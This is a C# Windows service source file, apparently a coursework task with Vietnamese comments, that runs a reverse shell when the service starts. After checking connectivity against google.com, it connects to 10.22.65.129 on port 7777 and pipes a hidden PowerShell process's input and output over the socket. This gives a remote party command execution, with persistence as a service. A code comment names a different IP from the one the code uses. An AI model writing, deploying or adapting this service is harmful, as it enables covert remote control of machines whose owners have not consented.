﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace UITService_Task3
{
    public partial class Service1 : ServiceBase
    {
        static StreamWriter writer;
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            string url = "http://www.google.com";
            WriteToFile("Service started at " + DateTime.Now);
            if (CheckForInternetConnection(url))
            {
                WriteToFile("Connected");
                ReverseShellService();
            }
            else
                WriteToFile("Not connected");
        }

        //Hàm viết vào file Logs
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to.
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }

        protected override void OnStop()
        {
            WriteToFile("Service stopped at " + DateTime.Now);
        }

        //Hàm để xử lý dữ liệu nhập vào, xử lý lỗi xảy ra
        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!string.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    writer.WriteLine(strOutput);
                    writer.Flush();
                }
                catch (Exception err) { }
            }
        }

        //Hàm mở kết nối ReverseShell
        public void ReverseShellService()
        {
            //Kết nối tới máy có địa chỉ IP 10.0.5.132 với port 7777
            using (TcpClient client = new TcpClient("10.22.65.129", 7777))
            {
                using (Stream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream))
                    {
                        writer = new StreamWriter(stream);
                        StringBuilder strInput = new StringBuilder();
                        //Tạo tiến trình mới
                        Process p = new Process();
                        //Mở file powershell để reverse shell
                        p.StartInfo.FileName = "powershell.exe";
                        //Điều chỉnh các thông số ban đầu của tiến trình
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        //Xử lý dữ liệu nhập xuất với hàm CmdOutputDataHandler
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        //Bắt đầu tiến trình
                        p.Start();
                        p.BeginOutputReadLine();
                        //Xử lý dữ liệu được nhập 
                        while (true)
                        {
                            strInput.Append(reader.ReadLine());
                            p.StandardInput.WriteLine(strInput);
                            strInput.Remove(0, strInput.Length);
                        }
                    }
                }
            }
        }

        //Hàm kiểm tra kết nối internet
        public static bool CheckForInternetConnection(string url)
        {
            try
            {
                // Tạo yêu cầu HTTP GET
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";

                // Gửi yêu cầu và nhận phản hồi
                using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                {
                    // Kiểm tra mã trạng thái của phản hồi
                    if (response.StatusCode == HttpStatusCode.OK)
                    {
                        return true; // Kết nối thành công
                    }
                    else
                    {
                        return false; // Kết nối không thành công
                    }
                }
            }
            catch (WebException)
            {
                return false; // Lỗi xảy ra hoặc kết nối không thành công
            }
        }
    }
}